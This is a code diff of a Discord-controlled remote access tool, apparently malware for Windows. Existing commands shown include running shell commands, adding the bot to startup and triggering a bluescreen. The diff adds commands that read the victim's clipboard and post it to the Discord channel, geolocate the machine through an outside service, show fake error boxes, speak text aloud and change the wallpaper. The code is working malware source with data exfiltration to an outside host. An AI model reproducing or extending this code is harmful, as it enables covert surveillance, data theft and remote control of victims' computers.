@@ -201,7 +201,7 @@ Y88b  d88P 888 Y88b 888 Y88b.  888  888 Y8b.     888     Y88b  d88P Y88..88P 888
     .blue               - sends a bluescreen ;)
     .start              - Adds the bot to the startup directory
     .exit               - closes the connection to the bot  
-    .restart            - restarts the connection to the bot                                           
+    .reload            - reloads the connection to the bot                                           
 """
 commands = "\n".join([
     ".help               - Shows this message",
@@ -216,7 +216,7 @@ commands = "\n".join([
     ".blue               - sends a bluescreen ;)",
     ".start              - Adds the bot to the startup directory",
     ".exit               - closes the connection to the bot",
-    ".restart            - restarts the connection to the bot"
+    ".reload            - reloads the connection to the bot"
 ])
 intents = discord.Intents.all()
 intents.members = True
@@ -227,7 +227,7 @@ async def find_channel_by_name(guild, channel_name):
         if channel.name == channel_name:
             return channel
     return None
-async def restart_program():
+async def reload_program():
     python = sys.executable
     script = os.path.abspath(__file__)
     subprocess.call([python, script])
@@ -344,9 +344,9 @@ async def on_message(message):
                 case ".purge":  
                     await message.reply('Purging...')
                     await message.channel.purge(limit=None) 
-                case ".restart":
+                case ".reload":
 
-                    new_msg = await message.reply("Are you sure you want to restart the connection?")
+                    new_msg = await message.reply("Are you sure you want to Reload the connection?")
                     await new_msg.add_reaction("✅")
                     await new_msg.add_reaction("❌")
                     def check(reaction, user):
@@ -355,9 +355,9 @@ async def on_message(message):
                     try:
                         reaction, user = await client.wait_for('reaction_add', timeout=60, check=check)
                         if str(reaction.emoji) == "✅":
-                           await message.channel.send("Restarting, please be patient...", delete_after =.5)
+                           await message.channel.send("reloading, please be patient...", delete_after =.5)
                            loadingscreen = await message.channel.send("https://cdn.discordapp.com/emojis/697961731099590787.gif?size=128&quality=lossless")
-                           await restart_program()
+                           await reload_program()
                            await loadingscreen.delete()
                            
                            await client.close()
@@ -372,11 +372,45 @@ async def on_message(message):
                     new_msg = await message.reply("Increasing the volume")
                     volumeup()
                     await channel.send("Volume is set to 100%")
-
-                case ".volumedown":
+                case ".volumedown" :
                     new_msg = await message.reply("Decreasing the volume")
                     volumedown()
                     await channel.send("Volume is set to 0%")
+                case ".admincheck":
+                    import ctypes
+                    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+                    if is_admin == True:
+                        await message.channel.send("Congrats, you're admin")
+                    elif is_admin == False:
+                        await message.channel.send(" Sorry, you're not admin <https://cdn.discordapp.com/emojis/661443224237375488.webp?size=128&quality=lossless>")
+                case ".location":
+                    import urllib.request
+                    import json
+                    with urllib.request.urlopen("https://geolocation-db.com/json") as url:
+                        data = json.loads(url.read().decode())
+                        link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
+                        await message.channel.send("Here is the location: " + link)
+                case ".clipboard":
+                    import ctypes
+                    import os
+                    CF_TEXT = 1
+                    kernel32 = ctypes.windll.kernel32
+                    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
+                    kernel32.GlobalLock.restype = ctypes.c_void_p
+                    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
+                    user32 = ctypes.windll.user32
+                    user32.GetClipboardData.restype = ctypes.c_void_p
+                    user32.OpenClipboard(0)
+                    if user32.IsClipboardFormatAvailable(CF_TEXT):
+                        data = user32.GetClipboardData(CF_TEXT)
+                        data_locked = kernel32.GlobalLock(data)
+                        text = ctypes.c_char_p(data_locked)
+                        value = text.value
+                        kernel32.GlobalUnlock(data_locked)
+                        body = value.decode()
+                        user32.CloseClipboard()
+                        await message.channel.send(f"Clipboard content is : \n``` {body}```")
+
 
 
             if message.content.lower().startswith(".export"):
@@ -389,15 +423,8 @@ async def on_message(message):
                     embed = discord.Embed(title="Error", description=f"```File Not Found```", color=0xfafafa)
                     await message.reply(embed=embed)
             elif message.content.lower().startswith(".upload"):
-                link = message.content[8:]
-                file = requests.get(link).content
-                file_name = os.path.basename(link)
-                file_name = file_name.rsplit('_', 1)[0] + '.' + file_name.rsplit('_', 1)[1]
-                with open(file_name, "wb") as f:
-                    f.write(file)
-                embed = discord.Embed(title="Upload", description=f"```{file_name}```", color=0xfafafa)
-                await message.reply(embed=embed)
-                await message.delete()
+                await message.attachments[0].save(message.content[8:])
+                await message.channel.send("uploaded file")
             elif message.content.lower().startswith(".shell"):
                 command = message.content[7:]
                 output = subprocess.Popen(
@@ -420,6 +447,7 @@ async def on_message(message):
                 await message.delete()
             elif message.content.lower().startswith(".cd"):
                 directory = message.content[4:]
+                
                 try:
                     os.chdir(directory)
                     files = "\n".join(os.listdir())
@@ -494,8 +522,45 @@ async def on_message(message):
                         await delmsg.delete()
                 except asyncio.TimeoutError:
                     await message.channel.send("You didn't react in time.")
-
-
+            elif message.content.lower().startswith(".say"):
+                content = message.content[4:]
+                volumeup()
+                import comtypes
+                import win32com.client as wincl
+                speak = wincl.Dispatch("SAPI.SpVoice")
+                speak.Speak(str(content))
+                comtypes.CoUninitialize()
+                await message.channel.send(f"just said ``{content}`` successfully")
+            elif message.content.lower().startswith(".message"):
+                content = message.content[9:]
+                import ctypes
+                import time
+                MB_YESNO = 0x04
+                MB_HELP = 0x4000
+                ICON_STOP = 0x10
+                def mess():
+                    ctypes.windll.user32.MessageBoxW(0, content, "Error", MB_HELP | MB_YESNO | ICON_STOP) #Show message box
+                import threading
+                messa = threading.Thread(target=mess)
+                messa._running = True
+                messa.daemon = True
+                messa.start()
+                import win32con
+                import win32gui
+                import time
+                time.sleep(1)
+                hwnd = win32gui.FindWindow(None, "Error") 
+                win32gui.ShowWindow(hwnd, win32con.SW_RESTORE) #Put message to foreground
+                win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
+                win32gui.SetWindowPos(hwnd,win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)  
+                win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
+            elif message.content.lower().startswith(".wallpaper"):
+                import ctypes
+                import os
+                path = os.path.join(os.getenv('TEMP') + "\\temp.jpg")
+                await message.attachments[0].save(path)
+                ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
+                await message.reply("changed wallpaper")
 
             elif message.content.lower().startswith(".mouse"):
                 command = message.content[7:]
